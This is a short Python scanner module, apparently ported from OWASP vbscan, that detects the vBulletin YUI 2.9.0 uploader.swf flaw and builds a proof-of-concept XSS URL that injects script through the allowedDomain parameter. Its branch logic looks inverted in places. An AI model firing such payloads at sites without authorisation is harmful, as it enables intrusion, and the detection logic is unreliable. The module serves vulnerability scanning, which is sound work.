def run(req, target, info_cb, found_cb, not_found_cb):
    # https://github.com/OWASP/vbscan/blob/master/exploit/yui.pl
    name = "vBulletin YUI 2.9.0 XSS"
    uri = f"{target}clientscript/yui/uploader/assets/uploader.swf"

    info_cb(f"Checking {name}")
    r = req.get(uri)

    if r.status_code == 200 and "x-shockwave-flash" in r.headers['Content-Type']:
        pass
    else:
        uri = f"{target}core/clientscript/yui/uploader/assets/uploader.swf"
        sr = req.get(uri)
        if sr.status_code == 200 and "x-shockwave-flash" in sr.headers['Content-Type']:
            not_found_cb(name)
            return

    check_url = f"{target}clientscript/yui/uploader/uploader-min.js"
    sr = req.get(check_url)
    if sr.status_code == 200 and "version: 2" in str(sr.content):
        url_attack = f"{target}core/clientscript/yui/uploader/assets/uploader.swf"
        url_attack += "?allowedDomain=\\\"})))}catch(e){alert(/XSS/);}//"
        found_cb(name, url_attack)
    else:
        not_found_cb(name)
